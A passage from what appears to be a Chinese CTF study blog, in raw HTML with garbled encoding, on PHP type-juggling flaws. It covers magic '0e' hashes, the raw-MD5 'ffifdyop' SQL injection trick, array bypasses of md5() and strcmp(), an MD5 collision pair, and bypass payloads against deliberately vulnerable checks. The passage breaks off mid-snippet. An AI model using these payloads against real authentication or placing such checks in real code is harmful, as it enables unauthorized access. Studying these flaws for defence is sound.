title="PHPæ¥æ”¶å‚æ•°"></a>PHPæ¥æ”¶å‚æ•°</h2><p><a href="https://blog.csdn.net/bylfsj/article/details/102770461">https://blog.csdn.net/bylfsj/article/details/102770461</a></p><p><a href="https://y4tacker.blog.csdn.net/article/details/120502141">https://y4tacker.blog.csdn.net/article/details/120502141</a></p><p><strong>PHPå°†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆåœ¨URLæˆ–æ­£æ–‡ä¸­ï¼‰è½¬æ¢ä¸ºå†…éƒ¨$_GETæˆ–çš„å…³è”æ•°ç»„$_POSTã€‚ä¾‹å¦‚ï¼š&#x2F;?foo&#x3D;barå˜æˆArray([foo] &#x3D;&gt; â€œbarâ€)</strong></p><p>phpä»è¯·æ±‚çš„urlä¸­å–å‡ºå‚æ•°å¹¶ä¿å­˜ä¹‹å‰ï¼Œå¯¹å‚æ•°åçš„æ“ä½œï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.åˆ é™¤å‚æ•°åå‰çš„ä¸€äº›ç¬¦å·</span><br><span class="line">2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆå°è¯•å[å¥½åƒä¸èƒ½è¢«è§£æä¸º_ï¼‰</span><br><span class="line">3.åˆ é™¤å‚æ•°ååçš„ä¸€äº›ç¬¦å·</span><br></pre></td></tr></table></figure><p><img src="/../images/1567560448_5d6f13004035f.png" alt="img"></p><h2 id="å¼±ç±»å‹æ¯”è¾ƒ"><a href="#å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="å¼±ç±»å‹æ¯”è¾ƒ"></a>å¼±ç±»å‹æ¯”è¾ƒ</h2><p>PHP7ä»¥å‰çš„ç‰ˆæœ¬æ”¯æŒå°†å¤šè¿›åˆ¶çš„æ•°å€¼è½¬æ¢ï¼Œæ‰€ä»¥â€™1â€™&#x3D;&#x3D;â€™0x1â€™æ˜¯æˆç«‹çš„ï¼Œä½†æ–°ç‰ˆæœ¬æ˜¯falseã€‚</p><h3 id="x3D-x3D-ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰"><a href="#x3D-x3D-ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰" class="headerlink" title="&#x3D;&#x3D;ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰"></a>&#x3D;&#x3D;ï¼ˆå®½æ¾æ¯”è¾ƒï¼‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line">å…¶ä»–æ•°å­—==True</span><br></pre></td></tr></table></figure><h4 id="æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—"><a href="#æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—" class="headerlink" title="æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—"></a>æ•°å­—å­—ç¬¦ä¸²ä¸æ•°å­—</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;   2asda&#x27;</span>==<span class="number">2</span>);<span class="comment">//true</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å› ä¸ºåœ¨æ‰§è¡Œå…³ç³»è¿ç®—â€&#x3D;&#x3D;â€œæ—¶è¦æ±‚è¿ç®—ç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹å¿…é¡»ä¸€è‡´(å­—ç¬¦ä¸²ä¸æ•´å‹æ¯”è¾ƒï¼Œå­—ç¬¦ä¸²â†’æ•´å‹)ï¼Œå½“å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´å‹æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥æ•´å‹å¼€å¤´æˆ–è€…ä»¥ç©ºæ ¼+æ•´å‹å¼€å¤´ï¼Œå°±å–æ•´å‹çš„å€¼ï¼Œåä¹‹åˆ™å–å€¼0.</p><p>ä¾‹å­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">payload:passwd=<span class="number">1234567</span>sdkasj  (ä¸è¦åŠ å¼•å·,é»˜è®¤æ¥æ”¶å­—ç¬¦ä¸²å‚æ•°)</span><br></pre></td></tr></table></figure><h4 id="0eç§‘å­¦è®¡æ•°æ³•"><a href="#0eç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="0eç§‘å­¦è®¡æ•°æ³•"></a>0eç§‘å­¦è®¡æ•°æ³•</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0easdasd9&quot;</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>è€Œå½“å­—ç¬¦ä¸²ä¸­å«æœ‰0e&#x2F;0Eæ—¶ï¼Œphpä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œè€Œ0çš„å¤šå°‘æ¬¡æ–¹éƒ½ç­‰äº0ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚</p><h3 id="x3D-x3D-x3D-ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰"><a href="#x3D-x3D-x3D-ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰" class="headerlink" title="&#x3D;&#x3D;&#x3D;ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰"></a>&#x3D;&#x3D;&#x3D;ï¼ˆä¸¥æ ¼æ¯”è¾ƒï¼‰</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;0dff&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> === <span class="variable">$str</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;true&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…¨ç­‰äºæ“ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š<br>1.åˆ¤æ–­ä¸¤è¾¹æ•°æ®ç±»å‹æ˜¯å¦ç›¸åŒ  </p><p>2.åˆ¤æ–­ä¸¤è¾¹å€¼æ˜¯å¦ç›¸åŒ</p><p>3.å°†å‰ä¸¤æ­¥çš„ç»“æœè¿›è¡Œä¸è¿ç®—ï¼Œå¾—å‡ºæœ€ç»ˆç»“æœ</p><h3 id="MD5ç¼ºé™·"><a href="#MD5ç¼ºé™·" class="headerlink" title="MD5ç¼ºé™·"></a><strong>MD5ç¼ºé™·</strong></h3><h5 id="â‘ MD5ï¼ˆstring-rawï¼‰å‡½æ•°è§£æ"><a href="#â‘ MD5ï¼ˆstring-rawï¼‰å‡½æ•°è§£æ" class="headerlink" title="â‘ MD5ï¼ˆstring,rawï¼‰å‡½æ•°è§£æ"></a>â‘ MD5ï¼ˆstring,rawï¼‰å‡½æ•°è§£æ</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ffifdyop&#x27;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;<span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6</span>ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</span><br><span class="line">å½“raw=<span class="literal">true</span>æ—¶ï¼Œæµè§ˆå™¨ä¼šå¯¹å…¶è¿”å›çš„æ•°æ®<span class="string">&#x27;or&#x27;</span><span class="number">6</span>\xc9]\x99\xe9!r,\xf9\xedb\x1cï¼ˆåŸå§‹äºŒè¿›åˆ¶æ ¼å¼ï¼‰è¿›è¡Œäº†å­—ç¬¦åŒ–å¤„ç†ï¼Œç”±æ­¤å°±ä¼šäº§ç”Ÿä¹±ç ã€‚</span><br><span class="line">æˆ‘ä»¬å¯ä»¥å‘ç°å¾—åˆ°çš„å­—ç¬¦ä¸²å«æœ‰<span class="string">&#x27;or&#x27;</span><span class="number">6</span>,,å¯ä»¥ç”¨æ¥è¿›è¡Œsqlæ³¨å…¥</span><br><span class="line">å¦‚select * <span class="keyword">from</span> <span class="string">&#x27;admin&#x27;</span> where password=<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>,<span class="literal">true</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;PHP&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>),<span class="number">8</span>,<span class="number">16</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$b</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;      <span class="number">04</span>a5c23ac138da22</span><br><span class="line"><span class="number">2</span>fec392304a5c23ac138da22847f9b7c</span><br><span class="line">æˆ‘ä»¬å¯ä»¥å‘ç°md5çš„å¯†æ–‡ä¸­ï¼Œ<span class="number">16</span>ä½å¯†æ–‡ä¸<span class="number">32</span>ä½å¯†æ–‡çš„ç¬¬<span class="number">8</span>-<span class="number">24</span>ä½å­å­—ç¬¦ä¸²æ˜¯ä¸€æ ·çš„ã€‚</span><br></pre></td></tr></table></figure><h5 id="â‘¡å¼±ç±»å‹æ¯”è¾ƒ"><a href="#â‘¡å¼±ç±»å‹æ¯”è¾ƒ" class="headerlink" title="â‘¡å¼±ç±»å‹æ¯”è¾ƒ"></a>â‘¡å¼±ç±»å‹æ¯”è¾ƒ</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œé€šè¿‡!=æˆ–==æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå½“å“ˆå¸Œå€¼å¼€å¤´ä¸º<span class="number">0</span>eæ—¶ï¼Œåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•ï¼Œè€Œ<span class="number">0</span>çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯<span class="number">0</span></span><br><span class="line">æ‰€ä»¥<span class="title function_ invoke__">MD5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>)==<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;s878926199a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">    </span><br><span class="line"><span class="number">1586264293</span></span><br><span class="line"><span class="number">0e622743671155995737639662718498</span></span><br><span class="line">    </span><br><span class="line"><span class="number">240610708</span></span><br><span class="line"><span class="number">0e462097431906509019562988736854</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="variable">$a</span>==<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)</span><br><span class="line"><span class="variable">$a</span>=<span class="number">0e215962017</span></span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)=<span class="number">0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure><h5 id="â‘¢å¼ºæ¯”è¾ƒç»•è¿‡"><a href="#â‘¢å¼ºæ¯”è¾ƒç»•è¿‡" class="headerlink" title="â‘¢å¼ºæ¯”è¾ƒç»•è¿‡"></a>â‘¢å¼ºæ¯”è¾ƒç»•è¿‡</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">åœ¨ä½¿ç”¨===æˆ–ï¼==æ¥è¿›è¡Œå¼ºæ¯”è¾ƒæ—¶</span><br><span class="line">    </span><br><span class="line">å¯ä»¥é€šè¿‡æ„é€ å‚æ•°ä¸ºæ•°ç»„ç±»å‹æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line">åŸç†ï¼š<span class="title function_ invoke__">md5</span>()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ç±»å‹çš„æ•°å€¼ï¼Œä¼šç›´æ¥è¿”å›<span class="literal">NULL</span></span><br><span class="line">é‚£ä¹ˆ<span class="title function_ invoke__">MD5</span>(param1[])===<span class="title function_ invoke__">MD5</span>(param2[])ä»è€Œç»•è¿‡</span><br><span class="line">å½“ç„¶å¼±ç±»å‹æ¯”è¾ƒä¹Ÿå¯ä»¥ä½¿ç”¨è¿™ç§æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡</span><br><span class="line">    </span><br><span class="line"> <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>)</span><br><span class="line">&gt;&gt;payload:id[]=xxx&amp;gg[]=xxx</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">ä½†æ˜¯å½“é™åˆ¶äº†ä¼ å…¥çš„å‚æ•°å¿…é¡»ä¸º<span class="keyword">string</span>ç±»å‹æ—¶ä¸Šè¿°æ–¹æ³•å°±ä¸å¯ä»¥äº†</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">ä½¿ç”¨md5ç¢°æ’ç”Ÿæˆç›¸åŒmd5</span><br><span class="line"></span><br><span class="line">urlç¼–ç  <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">89</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">94</span>%<span class="number">92</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%<span class="number">7</span>B%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%A3%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>B%C8z%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CCW%B3M%<span class="number">3</span>E%C8</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">urlç¼–ç  <span class="number">1</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%<span class="number">00</span>%CEZr%C6%<span class="number">1</span>D%<span class="number">28</span>j%<span class="number">22</span>%<span class="number">9</span>E%<span class="number">60</span>%<span class="number">8</span>Dt%AB4%ADU%E5%<span class="number">8</span>B%<span class="number">89</span>%<span class="number">09</span>%E6j%D0FH%EE8%D1%E6%<span class="number">11</span>%<span class="number">18</span>%AB3%A6%EC%E3%B8%<span class="number">2</span>F%<span class="number">3</span>C%<span class="number">97</span>k%<span class="number">0</span>CIt%<span class="number">02</span>%<span class="number">14</span>%<span class="number">93</span>W%<span class="number">9</span>D%ED%B9%EDc%CC%<span class="number">5</span>D%<span class="number">2</span>A%A1%<span class="number">9</span>B%B3%FB%<span class="number">27</span>%<span class="number">13</span>i%<span class="number">05</span>%<span class="number">8</span>A%A7%<span class="number">5</span>E%B3J%BE.R%A6%D7%D5%<span class="number">7</span>C%A4%<span class="number">24</span>%A5%DB%<span class="number">84</span>%D8%E7%<span class="number">23</span>%<span class="number">03</span>%E4F%EC%<span class="number">1</span>C%<span class="number">95</span>%B1%D6L%<span class="number">88</span>%AD%CD%D5%CF%B6%E8%<span class="number">26</span>%AEff%<span class="number">2</span>A%<span class="number">3</span>B%C9%D9%<span class="number">9</span>BHz%<span class="number">7</span>E%DB%A4m%C5%<span class="number">8</span>F%CF%<span class="number">83</span>%<span class="number">06</span>%<span class="number">5</span>E%EA%CC%D7%B3M%<span class="number">3</span>E%C8</span><br></pre></td></tr></table></figure><h2 id="è¯­è¨€æ„é€ å™¨"><a href="#è¯­è¨€æ„é€ å™¨" class="headerlink" title="è¯­è¨€æ„é€ å™¨"></a>è¯­è¨€æ„é€ å™¨</h2><p>[è¯­è¨€æ„é€ å™¨å’Œå˜é‡å‡½æ•°]<a href="https://segmentfault.com/q/1010000000188609">https://segmentfault.com/q/1010000000188609</a></p><p><img src="/../images/image-20220701135401603-1687677391910.png" alt="image-20220701135401603">å½“è§£é‡Šå™¨é‡åˆ°ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hello world&#x27;</span>;</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„ä¸€ä¸ªè¡¨è¾¾å¼çš„æ—¶å€™ï¼Œå¹¶ä¸ä¼šæŠŠå®ƒè½¬æ¢æˆå‡½æ•°è°ƒç”¨ï¼Œè€Œæ˜¯ç›´æ¥æ˜ å°„åˆ°ä¸€ç³»åˆ—é¢„å…ˆå®šä¹‰å¥½çš„æ“ä½œã€‚ä½¿ç”¨è¯­è¨€æ„æˆçš„æ—¶å€™å¯ä»¥åŠ æ‹¬å·ï¼Œä¹Ÿå¯ä»¥ä¸åŠ æ‹¬å·ï¼Œä½†æ˜¯ä½¿ç”¨å‡½æ•°çš„æ—¶å€™å¿…é¡»åŠ æ‹¬å·ã€‚</p><h2 id="ç²¾åº¦ç¼ºé™·"><a href="#ç²¾åº¦ç¼ºé™·" class="headerlink" title="ç²¾åº¦ç¼ºé™·"></a>ç²¾åº¦ç¼ºé™·</h2><p>phpæœ€å¤§ç²¾åº¦æ˜¯14ä½ï¼Œå¦‚æœè¶…å‡º14ä½ä¼šè¡°å‡</p><p><img src="/../images/1598509437.png!small" alt="1598509437.png!small"></p><p><img src="/../images/1598509504.png!small" alt="1598509504.png!small"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;trick1 !== <span class="variable language_">$this</span>-&gt;trick2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick1) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;trick2) &amp;&amp; <span class="variable language_">$this</span>-&gt;trick1 != <span class="variable language_">$this</span>-&gt;trick2)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">trick1=<span class="number">0.1</span>&amp;trick2=<span class="number">0.100000000000001</span></span><br><span class="line"></span><br><span class="line">éƒ½ä¸ºINF/<span class="title function_ invoke__">NAN</span>(æå°/æå¤§)</span><br></pre></td></tr></table></figure><h2 id="strcmp-â€“æ•°å€¼æ¯”è¾ƒ"><a href="#strcmp-â€“æ•°å€¼æ¯”è¾ƒ" class="headerlink" title="strcmp()â€“æ•°å€¼æ¯”è¾ƒ"></a>strcmp()â€“æ•°å€¼æ¯”è¾ƒ</h2><p>ä½¿ç”¨æ¡ä»¶ï¼šphp&gt;&#x3D;5.3</p><p>å½“ç¨‹åºé€»è¾‘è¿›è¡Œäº†æ•°å€¼çš„æ¯”è¾ƒæ—¶ï¼Œå¯ä»¥å°è¯•æ¯”è¾ƒå‡½æ•°æ˜¯å¦ä¸ºstrcmp()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">strcmp</span> ( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> )</span><br><span class="line">å¦‚æœ str1 å°äº str2 è¿”å› &lt; <span class="number">0</span>ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; <span class="number">0</span>ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› <span class="number">0</span>ã€‚(åŒºåˆ†å¤§å°å†™)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä½†æ˜¯<span class="title function_ invoke__">strcmp</span>()æ¯”è¾ƒçš„å¯¹è±¡æ˜¯å­—ç¬¦ä¸²å’Œæ•°ç»„çš„æ—¶å€™ï¼Œè™½ç„¶ä¼šæŠ¥é”™ï¼Œä½†æ˜¯ä»ç„¶ä¼šç›´æ¥è¿”å›<span class="number">0</span>ï¼Œè¿™æ ·é€šè¿‡æŠŠç›®æ ‡å˜é‡è®¾ç½®æˆæ•°ç»„å°±å¯ä»¥ç»•è¿‡è¯¥å‡½æ•°çš„é™åˆ¶ã€‚</span><br><span class="line"><span class="comment">#php7.0</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$password</span> = [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strcmp</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="variable">$password</span>))<span class="comment">//å­—ç¬¦ä¸²ä¸æ•°ç»„è¿›è¡Œæ¯”è¾ƒ</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;No!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&gt;&gt;Warning: <span class="title function_ invoke__">strcmp</span>() expects parameter <span class="number">2</span> to be <span class="keyword">string</span>, <span class="keyword">array</span> given in /usercode/file.php on line <span class="number">3</span></span><br><span class="line">Success!</span><br></pre></td></tr></table></figure><h2 id="intval-â€“php5"><a href="#intval-â€“php5" class="headerlink" title="intval()â€“php5"></a>intval()â€“php5</h2><p><img src="/../images/image-20220922202838221-1687432076954.png" alt="image-20220922202838221"></p><h2 id="is-numericï¼ˆï¼‰"><a href="#is-numericï¼ˆï¼‰" class="headerlink" title="is_numericï¼ˆï¼‰"></a>is_numericï¼ˆï¼‰</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]:<span class="number">0</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into test(type)values(<span class="subst">$s</span>);&quot;</span>;  <span class="comment">//æ˜¯ values($s) ä¸æ˜¯values(&#x27;$s&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span 